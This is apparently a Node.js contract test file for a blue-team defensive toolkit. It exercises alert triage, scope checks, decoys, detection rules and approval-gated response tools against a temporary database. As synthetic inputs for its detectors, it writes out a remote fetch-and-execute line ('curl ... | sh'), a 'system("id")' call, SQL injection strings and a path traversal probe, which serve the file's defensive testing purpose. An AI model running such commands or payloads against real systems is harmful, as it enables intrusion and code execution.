#!/usr/bin/env node
/**
 * M4.0 工具契约测试：session 6 + asset 2 + alert 3。
 * 只使用临时 SQLite，不连接真实目标。
 */
import assert from 'node:assert/strict'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { BlueStoreV3 } from '../v3/store.js'
import { apply } from '../v3/tools.js'

const root = mkdtempSync(join(tmpdir(), 'blue-v3-m4-'))
process.env.BLUE_TELEMETRY_ROOT = root
const store = new BlueStoreV3(root)
const registered = new Map()
const mode = { version: '3.0.0-dev', package_version: '2.0.0', skeleton: false }

const ctx = {
  blueTeamV3: store,
  tools: { register: (definition) => registered.set(definition.name, definition) },
  effect: (fn) => fn(),
  get: (name) => {
    if (name === 'blueTeamV3') return store
    if (name === 'blueTeamModeV3') return mode
    return undefined
  },
  logger: { info: () => {} },
}

apply(ctx)

function makeExec(id = 'S1', messages = ['防御自检'], parent = null) {
  const events = messages.map((text) => ({ type: 'user/message', data: { text } }))
  return {
    agent: {
      session: {
        id,
        parentSessionId: null,
        parentSession: parent,
        header: parent === null ? {} : { parentSession: parent },
        snapshotEvents: () => events,
      },
    },
  }
}

async function call(name, args = {}, exec = makeExec()) {
  const definition = registered.get(name)
  assert.ok(definition, '未注册工具：' + name)
  const output = await definition.execute(args, exec)
  return JSON.parse(output)
}

const expected = [
  'blue_engagement_open', 'blue_session_info', 'blue_scope_check',
  'blue_preflight', 'blue_defense_selfcheck', 'blue_tool_catalog',
  'blue_asset_add', 'blue_asset_query',
  'blue_alert_ingest', 'blue_alert_list', 'blue_alert_triage',
  'blue_finding_add', 'blue_finding_update', 'blue_finding_list',
  'blue_ioc_add', 'blue_ioc_list', 'blue_ioc_check',
  'blue_task_create', 'blue_task_update', 'blue_task_approve', 'blue_task_list', 'blue_autopilot',
  'blue_incident_open', 'blue_incident_list', 'blue_incident_update', 'blue_incident_attach',
  'blue_decision_add', 'blue_decision_list', 'blue_timeline', 'blue_report',
  'blue_deception_plan', 'blue_decoy_create', 'blue_decoy_hit', 'blue_decoy_list',
  'blue_decoy_update', 'blue_decoy_sync', 'blue_tarpit_plan',
  'blue_honeypot_ingest', 'blue_access_log_ingest',
  'blue_detection_rule_add', 'blue_detection_rule_list', 'blue_detection_scan',
  'blue_telemetry_source_add', 'blue_telemetry_poll', 'blue_telemetry_health',
  'blue_control_scan', 'blue_control_list',
  'blue_cve_pack', 'blue_cve_scan', 'blue_cve_campaign',
  'blue_attack_coverage', 'blue_risk_graph',
  'blue_evidence_export', 'blue_evidence_verify',
  'blue_audit_verify', 'blue_audit_anchor', 'blue_audit_anchor_verify',
  'blue_defense_status', 'blue_anchor_push',
  'blue_response_plan', 'blue_response_update', 'blue_response_list',
  'blue_response_execute', 'blue_response_verify',
  'blue_policy_validate', 'blue_policy_test', 'blue_policy_diff',
  'blue_gateway_status',
  'blue_range', 'blue_protect', 'blue_knowledge',
  'blue_log_scan', 'blue_artifact_triage', 'blue_hardening_check',
  'blue_containment_plan', 'blue_playbook_list',
]
assert.deepEqual([...registered.keys()].sort(), expected.slice().sort())
assert.equal(registered.size, 76)

try {
  const exec = makeExec()

  const info = await call('blue_session_info', {}, exec)
  assert.equal(info.ok, true)
  assert.equal(info.session.bound_engagement, null)

  const blocked = await call('blue_asset_add', { name: '未自检资产' }, exec)
  assert.equal(blocked.ok, false)
  assert.equal(blocked.code, 'SELF_CHECK_REQUIRED')

  const noUser = await call('blue_defense_selfcheck', { phrase: '防御自检' }, makeExec('S0', ['你好']))
  assert.equal(noUser.ok, false)
  assert.equal(noUser.code, 'SELF_CHECK_USER')

  const runtimeExec = {
    agent: {
      session: {
        id: 'S-RUNTIME',
        header: {},
        snapshotEvents: () => [
          { type: 'user/message', data: { content: [{ type: 'text', text: '防御自检' }], source: { kind: 'user' } } },
          { type: 'user/message', data: { content: [{ type: 'text', text: '<system-reminder>runtime</system-reminder>' }], source: { kind: 'runtime-context' } } },
          { type: 'user/message', data: { content: [{ type: 'text', text: '<available_skills/>' }], source: { kind: 'skill-catalog' } } },
        ],
      },
    },
  }
  const runtimeCheck = await call('blue_defense_selfcheck', { phrase: '防御自检' }, runtimeExec)
  assert.equal(runtimeCheck.ok, true)

  const wrongPhrase = await call('blue_defense_selfcheck', { phrase: '自检' }, exec)
  assert.equal(wrongPhrase.ok, false)
  assert.equal(wrongPhrase.code, 'SELF_CHECK_PHRASE')

  const checked = await call('blue_defense_selfcheck', { phrase: '防御自检' }, exec)
  assert.equal(checked.ok, true)

  const opened = await call('blue_engagement_open', {
    name: '演示防守目标',
    scope: ['10.10.0.0/24', 'example.test'],
    note: 'M4.0 契约测试',
  }, exec)
  assert.equal(opened.ok, true, JSON.stringify(opened))
  assert.equal(opened.engagement.name, '演示防守目标')
  assert.equal(opened.session.bound_engagement.name, '演示防守目标')

  const info2 = await call('blue_session_info', {}, exec)
  assert.equal(info2.session.bound_engagement.id, opened.engagement.id)

  const protect = await call('blue_protect', {
    action: 'start',
    target: 'https://protected.example.test',
    name: '我的网站',
  }, exec)
  assert.equal(protect.ok, true)
  assert.equal(protect.checklist.length, 5)
  assert.ok(protect.asset.id)
  const protectStatus = await call('blue_protect', {
    action: 'status',
  }, exec)
  assert.equal(protectStatus.headline, '待接入日志')
  assert.equal(protectStatus.summary.assets, 1)
  const protect2 = await call('blue_protect', {
    action: 'start',
    target: 'http://127.0.0.1:59654/',
  }, exec)
  assert.notEqual(protect2.engagement.id, protect.engagement.id)
  assert.match(protect2.engagement.name, /59654/)
  const rebound = await call('blue_engagement_open', {
    name: '演示防守目标',
    scope: ['10.10.0.0/24', 'example.test'],
  }, exec)
  assert.equal(rebound.ok, true)

  const child = makeExec('S1-CHILD', [], 'S1')
  const childInfo = await call('blue_session_info', {}, child)
  assert.equal(childInfo.session.is_subagent, true)
  assert.equal(childInfo.session.bound_engagement.id, opened.engagement.id)
  const childQuery = await call('blue_asset_query', {}, child)
  assert.equal(childQuery.ok, true)
  assert.equal(childQuery.code, undefined)

  const inScope = await call('blue_scope_check', { target: 'https://app.example.test/login' }, exec)
  assert.equal(inScope.ok, true)
  assert.equal(inScope.status, 'in')

  const cidr = await call('blue_scope_check', { target: '10.10.0.42' }, exec)
  assert.equal(cidr.status, 'in')

  const outScope = await call('blue_scope_check', { target: '192.0.2.9' }, exec)
  assert.equal(outScope.ok, false)
  assert.equal(outScope.status, 'out')

  const asset = await call('blue_asset_add', {
    name: '门户',
    address: 'app.example.test',
    kind: 'web',
    port: 443,
    criticality: 'high',
    tags: ['对外', '登录'],
  }, exec)
  assert.equal(asset.ok, true)
  assert.equal(asset.asset.name, '门户')
  assert.equal(asset.stats.assets, 1)

  const asset2 = await call('blue_asset_add', {
    name: '门户（更新）',
    address: 'app.example.test',
    kind: 'web',
    port: 443,
    service: 'nginx',
  }, exec)
  assert.equal(asset2.ok, true)
  assert.equal(asset2.stats.assets, 1)
  assert.equal(asset2.asset.service, 'nginx')

  const assets = await call('blue_asset_query', { q: '门户', limit: 10 }, exec)
  assert.equal(assets.ok, true)
  assert.equal(assets.count, 1)

  const alert = await call('blue_alert_ingest', {
    title: '可疑登录',
    severity: 'high',
    source: 'waf',
    external_id: 'evt-1',
    raw: '{"user":"demo"}',
  }, exec)
  assert.equal(alert.ok, true)
  assert.equal(alert.ingested, 1)
  assert.ok(alert.knowledge_learned >= 1)
  assert.equal(alert.stats.alerts, 1)

  const duplicate = await call('blue_alert_ingest', {
    title: '可疑登录',
    severity: 'high',
    source: 'waf',
    external_id: 'evt-1',
    raw: '{"user":"demo"}',
  }, exec)
  assert.equal(duplicate.updated, 1)
  assert.equal(duplicate.stats.alerts, 1)

  const batch = await call('blue_alert_ingest', {
    raw: JSON.stringify([
      { title: '扫描', severity: 'medium', source: 'ids', id: 'evt-2' },
      { title: '爆破', severity: 'critical', source: 'ids', id: 'evt-3' },
    ]),
  }, exec)
  assert.equal(batch.ingested, 2)
  assert.equal(batch.stats.alerts, 3)

  const list = await call('blue_alert_list', { severity: 'critical' }, exec)
  assert.equal(list.count, 1)

  const triaged = await call('blue_alert_triage', {
    id: alert.alerts[0].id,
    status: 'investigating',
    note: '确认是合成数据',
    confidence: 'high',
  }, exec)
  assert.equal(triaged.ok, true)
  assert.equal(triaged.alert.status, 'investigating')
  assert.equal(triaged.task, null)

  const triagedWithTask = await call('blue_alert_triage', {
    id: alert.alerts[0].id,
    status: 'contained',
    create_task: true,
    role: 'ir',
    note: '确认是合成数据，转处置',
  }, exec)
  assert.equal(triagedWithTask.ok, true)
  assert.ok(triagedWithTask.task)
  assert.equal(triagedWithTask.alert.task_id, triagedWithTask.task.id)

  const finding = await call('blue_finding_add', {
    title: '暴露的备份目录',
    severity: 'high',
    category: 'exposure',
    evidence: 'GET /.git/config 返回 200',
    recommendation: '禁止 Web 根目录访问 .git',
  }, exec)
  assert.equal(finding.ok, true)
  assert.equal(finding.stats.findings, 1)

  const findingUpdated = await call('blue_finding_update', {
    id: finding.finding.id,
    status: 'fixed',
    evidence: '复测 404',
  }, exec)
  assert.equal(findingUpdated.finding.status, 'fixed')

  const findings = await call('blue_finding_list', { status: 'fixed' }, exec)
  assert.equal(findings.count, 1)

  const ioc = await call('blue_ioc_add', {
    type: 'ip',
    value: '203.0.113.7',
    source: '合成情报',
    confidence: 'high',
  }, exec)
  assert.equal(ioc.ok, true)
  assert.equal(ioc.total, 1)

  const iocList = await call('blue_ioc_list', { type: 'ip' }, exec)
  assert.equal(iocList.count, 1)

  const iocCheck = await call('blue_ioc_check', {
    text: 'login from 203.0.113.7\nnext line',
  }, exec)
  assert.equal(iocCheck.matched, true)
  assert.equal(iocCheck.hits[0].line, 1)

  const highTask = await call('blue_task_create', {
    role: 'ir',
    title: '隔离主机 10.10.0.42',
    brief: '隔离主机并封禁异常端口',
    priority: 'P0',
    acceptance: '隔离完成并给出验证证据',
  }, exec)
  assert.equal(highTask.ok, true)
  assert.equal(highTask.task.risk_level, 'high')
  assert.equal(highTask.task.status, 'pending_approval')
  assert.equal(highTask.task.requires_approval, 1)

  const roleChange = await call('blue_task_update', {
    id: highTask.task.id,
    role: 'monitor',
  }, exec)
  assert.equal(roleChange.ok, false)
  assert.equal(roleChange.code, 'TASK_ROLE_IMMUTABLE')

  const nextBeforeApprove = await call('blue_autopilot', { action: 'next', limit: 5 }, exec)
  assert.ok(!(nextBeforeApprove.dispatches || []).some((item) => item.task_id === highTask.task.id))

  const approved = await call('blue_task_approve', {
    task_id: highTask.task.id,
    actor: 'human-operator',
    note: 'M4.1 合成审批',
  }, exec)
  assert.equal(approved.ok, true)
  assert.equal(approved.task.status, 'queued')
  assert.equal(approved.task.approved_by, 'human-operator')

  const tasks = await call('blue_task_list', { risk_level: 'high' }, exec)
  assert.equal(tasks.count, 1)

  const next = await call('blue_autopilot', { action: 'next', limit: 5 }, exec)
  assert.equal(next.ok, true)
  assert.ok(next.dispatches.some((item) => item.task_id === highTask.task.id))

  const completed = await call('blue_autopilot', {
    action: 'complete',
    task_id: highTask.task.id,
    result: '已隔离并验证',
  }, exec)
  assert.equal(completed.ok, true)
  assert.equal(completed.task.status, 'done')

  const slots = await call('blue_autopilot', { action: 'set_slots', slots: 4 }, exec)
  assert.equal(slots.max_slots, 4)

  const autoStatus = await call('blue_autopilot', { action: 'status' }, exec)
  assert.equal(autoStatus.ok, true)
  assert.equal(autoStatus.max_slots, 4)

  const incident = await call('blue_incident_open', {
    title: '合成登录事件',
    severity: 'high',
    summary: 'M4.1 契约测试',
  }, exec)
  assert.equal(incident.ok, true)

  const incidents = await call('blue_incident_list', {}, exec)
  assert.equal(incidents.count, 1)

  const incidentUpdated = await call('blue_incident_update', {
    id: incident.incident.id,
    status: 'investigating',
  }, exec)
  assert.equal(incidentUpdated.incident.status, 'investigating')

  const attached = await call('blue_incident_attach', {
    id: incident.incident.id,
    alert_id: alert.alerts[0].id,
    finding_id: finding.finding.id,
    task_id: highTask.task.id,
  }, exec)
  assert.equal(attached.ok, true)
  assert.equal(attached.attached.length, 3)

  const decision = await call('blue_decision_add', {
    decision: '将合成登录事件升级为调查',
    rationale: '告警与发现指向同一路径',
    incident_id: incident.incident.id,
    confidence: 'high',
  }, exec)
  assert.equal(decision.ok, true)
  const decisions = await call('blue_decision_list', { incident_id: incident.incident.id }, exec)
  assert.equal(decisions.count, 1)

  const timelineAdd = await call('blue_timeline', {
    actor: 'commander',
    event: 'containment',
    target: 'app.example.test',
    detail: '合成时间线',
  }, exec)
  assert.equal(timelineAdd.ok, true)
  const timelineList = await call('blue_timeline', { mode: 'list', limit: 10 }, exec)
  assert.ok(timelineList.timeline.length >= 1)

  const report = await call('blue_report', {}, exec)
  assert.equal(report.ok, true)
  assert.ok(report.markdown.includes('蓝队防守报告'))
  assert.ok(report.bytes > 100)

  const reportWrite = await call('blue_report', { write: true, path: 'test-report.md' }, exec)
  assert.equal(reportWrite.ok, true)
  assert.ok(reportWrite.file.endsWith('test-report.md'))
  assert.ok(reportWrite.bytes > 100)

  const plan = await call('blue_deception_plan', {}, exec)
  assert.equal(plan.ok, true)
  assert.equal(plan.templates.length, 5)

  const deniedDecoy = await call('blue_decoy_create', {
    kind: 'canary_url',
    name: 'denied',
    target: 'https://app.example.test/denied',
    authorized: false,
  }, exec)
  assert.equal(deniedDecoy.code, 'DECOY_AUTH')

  const outOfScopeDecoy = await call('blue_decoy_create', {
    kind: 'canary_url',
    name: 'outside',
    target: 'https://192.0.2.10/outside',
    authorized: true,
    deployed: true,
  }, exec)
  assert.equal(outOfScopeDecoy.code, 'DECOY_SCOPE')

  const decoy = await call('blue_decoy_create', {
    kind: 'canary_url',
    name: 'canary-1',
    target: 'https://app.example.test/canary',
    authorized: true,
    deployed: false,
    ttl_hours: 24,
  }, exec)
  assert.equal(decoy.ok, true)
  assert.equal(decoy.decoy.status, 'planned')

  const hit = await call('blue_decoy_hit', {
    decoy: decoy.decoy.id,
    source: '198.51.100.9',
    evidence: 'GET /canary',
  }, exec)
  assert.equal(hit.ok, true)

  const decoys = await call('blue_decoy_list', {}, exec)
  assert.ok(decoys.decoys.length >= 1)

  const active = await call('blue_decoy_update', {
    id: decoy.decoy.id,
    status: 'active',
    note: '人工确认已部署',
  }, exec)
  assert.equal(active.decoy.status, 'active')

  const syncPath = join(root, 'decoy-events.jsonl')
  writeFileSync(syncPath, JSON.stringify({
    decoy: 'canary-1',
    source: '198.51.100.10',
    evidence: 'GET /canary?x=1',
    event_key: 'evt-decoy-1',
  }) + '\n', 'utf8')
  const synced = await call('blue_decoy_sync', {
    path: syncPath,
    authorized: true,
    max_events: 10,
  }, exec)
  assert.equal(synced.ok, true)
  assert.equal(synced.synced, 1)

  const tarpit = await call('blue_tarpit_plan', { ssh_port: 2222, ban_days: 7 }, exec)
  assert.equal(tarpit.ok, true)
  assert.ok(tarpit.endlessh.config.includes('Port 2222'))

  const honeypot = await call('blue_honeypot_ingest', {
    target: 'https://app.example.test/honeypot',
    source_ip: '198.51.100.11',
    payload: 'synthetic probe',
    path: '/honeypot',
  }, exec)
  assert.equal(honeypot.ok, true)
  assert.equal(honeypot.approval_required, true)
  assert.equal(honeypot.task.status, 'pending_approval')

  const accessPath = join(root, 'access.jsonl')
  writeFileSync(accessPath, [
    JSON.stringify({ status: 401, path: '/admin/login', remote: '198.51.100.12', at: '2026-11-18T00:00:00Z' }),
    JSON.stringify({ status: 200, path: '/public', remote: '198.51.100.13', at: '2026-11-18T00:00:01Z' }),
    JSON.stringify({ status: 404, path: '/admin%2f..%2fpublic', remote: '198.51.100.14', at: '2026-11-18T00:00:02Z' }),
  ].join('\n') + '\n', 'utf8')
  const access = await call('blue_access_log_ingest', {
    path: accessPath,
    max_events: 10,
    max_alerts: 10,
  }, exec)
  assert.equal(access.ok, true)
  assert.equal(access.suspicious, 2)
  assert.equal(access.ingested, 2)

  const telemetryPath = join(root, 'telemetry.jsonl')
  writeFileSync(telemetryPath, [
    JSON.stringify({ path: '/admin/login', status: 401, remote: '198.51.100.20' }),
    JSON.stringify({ path: '/public', status: 200, remote: '198.51.100.21' }),
  ].join('\n') + '\n', 'utf8')

  const rule = await call('blue_detection_rule_add', {
    rule_key: 'admin-login-fail',
    title: '管理入口登录失败',
    severity: 'high',
    selection: JSON.stringify({ path: ['/admin*'], status: [401, 403] }),
    condition: 'all',
  }, exec)
  assert.equal(rule.ok, true)
  assert.equal(rule.rule.rule_key, 'admin-login-fail')

  const ruleList = await call('blue_detection_rule_list', {}, exec)
  assert.equal(ruleList.count, 6)
  assert.equal(ruleList.builtin, 5)
  assert.equal(ruleList.custom, 1)

  const taggedRule = await call('blue_detection_rule_add', {
    rule_key: 'custom-t1059',
    title: '自定义命令执行标签',
    severity: 'high',
    selection: JSON.stringify({ path: ['/never-match-this-path'] }),
    condition: 'any',
    tags: ['T1059'],
  }, exec)
  assert.equal(taggedRule.ok, true)

  const nestedPath = join(root, 'nested-401.jsonl')
  writeFileSync(nestedPath, JSON.stringify({
    http: { status: 401 },
    path: '/admin/login',
    method: 'POST',
  }) + '\n', 'utf8')
  await call('blue_telemetry_source_add', { name: 'nested-401', path: nestedPath }, exec)
  const nestedScan = await call('blue_detection_scan', { source: 'nested-401' }, exec)
  assert.equal(nestedScan.hits.length, 2)
  assert.ok(nestedScan.hits.some((hit) => hit.rule === 'builtin-auth-path'))

  const telemetrySource = await call('blue_telemetry_source_add', {
    name: 'test-jsonl',
    path: telemetryPath,
  }, exec)
  assert.equal(telemetrySource.ok, true)

  const detectionScan = await call('blue_detection_scan', {
    source: 'test-jsonl',
    max_events: 10,
  }, exec)
  assert.equal(detectionScan.hits.length, 3)
  assert.ok(detectionScan.hits.some((hit) => hit.source === 'builtin'))

  const poll = await call('blue_telemetry_poll', { name: 'test-jsonl', max_alerts: 10 }, exec)
  assert.equal(poll.ok, true)
  assert.equal(poll.results[0].alerts, 3)

  const telemetryHealth = await call('blue_telemetry_health', {}, exec)
  assert.ok(telemetryHealth.count >= 1)

  const previousDsh = process.env.DSH_HOME
  process.env.DSH_HOME = root
  const ctfDir = join(root, 'ctf-lab')
  mkdirSync(ctfDir, { recursive: true })
  const ctfPath = join(ctfDir, 'access.jsonl')
  writeFileSync(ctfPath, JSON.stringify({ status: 401, path: '/admin/login', remote: '198.51.100.30' }) + '\n', 'utf8')
  const ctfSource = await call('blue_telemetry_source_add', { name: 'ctf-jsonl', path: ctfPath }, exec)
  assert.equal(ctfSource.ok, true)
  const ctfPoll = await call('blue_telemetry_poll', { name: 'ctf-jsonl' }, exec)
  assert.equal(ctfPoll.ok, true)
  assert.ok(ctfPoll.results[0].read >= 1)
  process.env.DSH_HOME = previousDsh

  const aggPath = join(root, 'aggregate.jsonl')
  const aggLine = JSON.stringify({ at: '2026-11-19T01:00:00Z', http: { status: 401 }, path: '/agg', remote: '198.51.100.9', method: 'GET' }) + '\n'
  writeFileSync(aggPath, aggLine + aggLine + aggLine, 'utf8')
  await call('blue_telemetry_source_add', { name: 'aggregate', path: aggPath }, exec)
  const aggPoll = await call('blue_telemetry_poll', { name: 'aggregate' }, exec)
  assert.equal(aggPoll.results[0].hits, 3)
  assert.equal(aggPoll.results[0].alerts, 1)
  assert.equal(aggPoll.results[0].updated, 2)

  const control = await call('blue_control_scan', {}, exec)
  assert.equal(control.ok, true)
  assert.equal(control.controls.length, 5)
  assert.equal(control.controls.find((row) => row.control_key === 'approval.pending').status, 'pass')
  assert.equal(control.score.measured, control.score.pass + control.score.fail)

  const controlList = await call('blue_control_list', {}, exec)
  assert.equal(controlList.score.total, 5)

  const cvePack = await call('blue_cve_pack', { product: 'Node.js' }, exec)
  assert.equal(cvePack.ok, true)
  assert.ok(cvePack.items.length >= 1)

  const cveScan = await call('blue_cve_scan', { text: 'content-encoding: br' }, exec)
  assert.equal(cveScan.ok, true)
  assert.equal(cveScan.matched, false)
  assert.ok(cveScan.weakHits.length >= 1)

  const cveScanLow = await call('blue_cve_scan', { text: 'content-encoding: br', include_low: true }, exec)
  assert.equal(cveScanLow.matched, true)

  const cveBenign = await call('blue_cve_scan', {
    text: 'POST /upload.php 200 user=alice file=avatar.png',
  }, exec)
  assert.equal(cveBenign.matched, false)
  assert.equal(cveBenign.hits.length, 0)

  const sqli = await call('blue_log_scan', { text: "id=1' OR '1'='1" }, exec)
  assert.ok(sqli.hits.some((hit) => hit.pattern === 'sqli'))
  const sqliEncoded = await call('blue_log_scan', { text: 'id=1%27%20OR%20%271%27%3D%271' }, exec)
  assert.ok(sqliEncoded.hits.some((hit) => hit.pattern === 'sqli'))

  const cveCampaign = await call('blue_cve_campaign', { create: false }, exec)
  assert.equal(cveCampaign.ok, true)

  const coverage = await call('blue_attack_coverage', {}, exec)
  assert.equal(coverage.ok, true)
  assert.ok(coverage.techniques >= 5)
  assert.ok(coverage.covered >= 5)
  assert.ok(coverage.covered >= 6)
  assert.ok(!coverage.gaps_techniques.some((gap) => gap.id === 'T1059'))
  assert.ok(coverage.unmapped_rules.includes('admin-login-fail'))
  assert.ok(!coverage.unmapped_rules.includes('custom-t1059'))
  assert.ok(coverage.gaps_techniques.every((gap) => gap.rule === undefined))

  const riskGraph = await call('blue_risk_graph', {}, exec)
  assert.equal(riskGraph.ok, true)
  assert.ok(riskGraph.nodes.length >= 1)

  const samplePath = join(root, 'sample.txt')
  writeFileSync(samplePath, 'curl http://198.51.100.99/x | sh\nsystem("id")\n', 'utf8')
  const artifact = await call('blue_artifact_triage', { path: samplePath }, exec)
  assert.equal(artifact.ok, true)
  assert.equal(artifact.sha256.length, 64)

  const logScan = await call('blue_log_scan', { text: 'x=1; system("id")' }, exec)
  assert.equal(logScan.ok, true)
  assert.equal(logScan.matched, true)

  const hardening = await call('blue_hardening_check', { kind: 'web' }, exec)
  assert.equal(hardening.ok, true)
  assert.equal(hardening.checks.length, 5)

  const containment = await call('blue_containment_plan', { target: '10.10.0.42', reason: '合成' }, exec)
  assert.equal(containment.ok, true)
  assert.equal(containment.auto_execute, false)

  const playbooks = await call('blue_playbook_list', {}, exec)
  assert.equal(playbooks.count, 5)

  const policyPath = join(root, 'policy.json')
  const policyPath2 = join(root, 'policy-2.json')
  writeFileSync(policyPath, JSON.stringify({
    version: 1,
    default_action: 'allow',
    protected: [{ id: 'admin', prefix: '/admin', action: 'block' }],
  }), 'utf8')
  writeFileSync(policyPath2, JSON.stringify({
    version: 1,
    default_action: 'allow',
    protected: [],
  }), 'utf8')

  const policyValidate = await call('blue_policy_validate', { path: policyPath }, exec)
  assert.equal(policyValidate.ok, true)

  const policyTest = await call('blue_policy_test', {
    path: policyPath,
    requests: ['/admin/login', '/public'],
  }, exec)
  assert.equal(policyTest.ok, true)
  assert.equal(policyTest.results[0].verdict.decision, 'block')

  const policyDiff = await call('blue_policy_diff', { a: policyPath, b: policyPath2 }, exec)
  assert.equal(policyDiff.ok, true)
  assert.equal(policyDiff.changed, true)

  const gateway = await call('blue_gateway_status', {}, exec)
  assert.equal(gateway.ok, true)

  const auditVerify = await call('blue_audit_verify', {}, exec)
  assert.equal(auditVerify.ok, true)

  const anchor = await call('blue_audit_anchor', { actor: 'tester' }, exec)
  assert.equal(anchor.ok, true)

  const anchorVerify = await call('blue_audit_anchor_verify', {}, exec)
  assert.equal(anchorVerify.ok, true)

  const anchorFile = join(root, 'anchors.jsonl')
  const anchorPush = await call('blue_anchor_push', {
    sinks: [{ kind: 'file', path: anchorFile }],
    actor: 'tester',
  }, exec)
  assert.equal(anchorPush.ok, true)
  assert.equal(anchorPush.pushed, true)

  const status = await call('blue_defense_status', {}, exec)
  assert.equal(status.ok, true)
  assert.ok(Array.isArray(status.suggestions))

  const response = await call('blue_response_plan', {
    action: 'isolate_host',
    target: '10.10.0.42',
    rollback: '重新接入网络',
    note: '合成响应',
  }, exec)
  assert.equal(response.ok, true)
  assert.equal(response.task.status, 'pending_approval')

  const responseList = await call('blue_response_list', {}, exec)
  assert.equal(responseList.actions.length, 1)

  const responseDryRun = await call('blue_response_execute', {
    response_id: response.action.id,
    mode: 'dry-run',
  }, exec)
  assert.equal(responseDryRun.ok, true)

  const responseCancel = await call('blue_response_update', {
    id: response.action.id,
    status: 'cancelled',
  }, exec)
  assert.equal(responseCancel.action.status, 'cancelled')

  const responseVerify = await call('blue_response_verify', { response_id: response.action.id }, exec)
  assert.equal(responseVerify.applied, false)
  assert.equal(responseVerify.ok, false)

  const evidence = await call('blue_evidence_export', { actor: 'tester' }, exec)
  assert.equal(evidence.ok, true)
  assert.equal(evidence.digest.length, 64)

  const evidenceVerify = await call('blue_evidence_verify', {
    bundle: evidence.bundle,
    digest: evidence.digest,
  }, exec)
  assert.equal(evidenceVerify.ok, true)
  assert.equal(evidenceVerify.digest_ok, true)

  const evidenceWritten = await call('blue_evidence_export', {
    actor: 'tester',
    write: true,
    path: 'test-evidence.json',
  }, exec)
  assert.equal(evidenceWritten.ok, true)
  assert.ok(evidenceWritten.file.endsWith('test-evidence.json'))
  const evidenceFromFile = await call('blue_evidence_verify', {
    path: evidenceWritten.file,
    digest: evidenceWritten.digest,
  }, exec)
  assert.equal(evidenceFromFile.ok, true)
  assert.equal(evidenceFromFile.digest_ok, true)

  const topLevel = await call('blue_alert_ingest', {
    title: '顶层标题优先',
    severity: 'critical',
    source: 'top-source',
    raw: JSON.stringify({ title: 'raw-title', severity: 'low', source: 'raw-source' }),
  }, exec)
  assert.equal(topLevel.alerts[0].title, '顶层标题优先')
  assert.equal(topLevel.alerts[0].severity, 'critical')
  assert.equal(topLevel.alerts[0].source, 'top-source')

  const bulkTriage = await call('blue_alert_triage', {
    ids: [alert.alerts[0].id, topLevel.alerts[0].id],
    status: 'false_positive',
    note: '批量复验',
  }, exec)
  assert.equal(bulkTriage.ok, true)
  assert.equal(bulkTriage.updated, 2)
  assert.equal(bulkTriage.failed, 0)

  const badTask = await call('blue_task_create', { role: 'not-a-role', title: 'x' }, exec)
  assert.equal(badTask.ok, false)
  assert.equal(badTask.params.role, 'not-a-role')

  const missingDeployed = await call('blue_decoy_create', {
    kind: 'canary_url',
    name: 'missing-deployed',
    target: 'https://app.example.test/x',
    authorized: true,
  }, exec)
  assert.equal(missingDeployed.code, 'DECOY_DEPLOYED')

  const activeDecoy = await call('blue_decoy_create', {
    kind: 'canary_url',
    name: 'active-decoy',
    target: 'https://app.example.test/active',
    authorized: true,
    deployed: true,
  }, exec)
  assert.equal(activeDecoy.decoy.status, 'active')

  const scopeExec = makeExec('S-SCOPE')
  await call('blue_defense_selfcheck', { phrase: '防御自检' }, scopeExec)
  const firstScope = await call('blue_engagement_open', {
    name: 'scope-first',
    scope: ['127.0.0.1'],
  }, scopeExec)
  const secondScope = await call('blue_engagement_open', {
    name: 'scope-second',
    scope: ['127.0.0.1'],
  }, scopeExec)
  const closeOther = await call('blue_engagement_open', {
    action: 'close',
    engagement: firstScope.engagement.id,
  }, scopeExec)
  assert.equal(closeOther.still_bound.id, secondScope.engagement.id)
  await call('blue_engagement_open', { action: 'close' }, scopeExec)
  await call('blue_engagement_open', {
    name: 'scope-v6',
    scope: ['2001:db8::/32', '10.0.0.10-10.0.0.20'],
  }, scopeExec)
  const v6 = await call('blue_scope_check', { target: '2001:db8::5' }, scopeExec)
  assert.equal(v6.status, 'in')
  const range = await call('blue_scope_check', { target: '10.0.0.15' }, scopeExec)
  assert.equal(range.status, 'in')
  const subCidr = await call('blue_scope_check', { target: '10.0.0.12/30' }, scopeExec)
  assert.equal(subCidr.status, 'in')
  const subRange = await call('blue_scope_check', { target: '10.0.0.11-10.0.0.12' }, scopeExec)
  assert.equal(subRange.status, 'in')
  const outside = await call('blue_scope_check', { target: '2001:db9::5' }, scopeExec)
  assert.equal(outside.status, 'out')
  const closed = await call('blue_engagement_open', { action: 'close' }, scopeExec)
  assert.equal(closed.engagement.status, 'closed')

  const log401 = await call('blue_log_scan', { text: '{"status":401,"path":"/admin/login"}' }, exec)
  assert.ok(log401.hits.some((hit) => hit.pattern === 'http-auth-fail'))

  const learned = await call('blue_knowledge', {
    action: 'learn',
    path: '/.env',
    method: 'GET',
    status: 403,
    title: '敏感文件探测',
    defense: '网关拒绝 /.env，不转发上游',
  }, exec)
  assert.equal(learned.created, true)
  assert.match(learned.entry.signature, /http:GET:\/\.env:403/)
  const matched = await call('blue_knowledge', {
    action: 'match',
    path: '/.env',
    method: 'GET',
    status: 403,
  }, exec)
  assert.equal(matched.matched, true)
  assert.equal(matched.entry.id, learned.entry.id)
  const defended = await call('blue_knowledge', { action: 'defend', id: learned.entry.id }, exec)
  assert.equal(defended.ok, true)
  assert.ok(defended.task.id)

  const preflight = await call('blue_preflight', {}, exec)
  assert.equal(preflight.ok, true)
  assert.equal(preflight.db.schema_version, '3.0')
  assert.equal(preflight.tools.registered, 76)
  assert.ok(preflight.channels.some((channel) => channel.id === 'tools' && channel.available === true))
  assert.ok(preflight.channels.some((channel) => channel.id === 'host_api' && channel.available === true))

  const catalog = await call('blue_tool_catalog', {}, exec)
  assert.equal(catalog.registered, 76)
  assert.equal(catalog.planned, 76)

  console.log('✓ v3 M4.3 工具全量注册：76/76')
} finally {
  store.close()
  rmSync(root, { recursive: true, force: true })
}
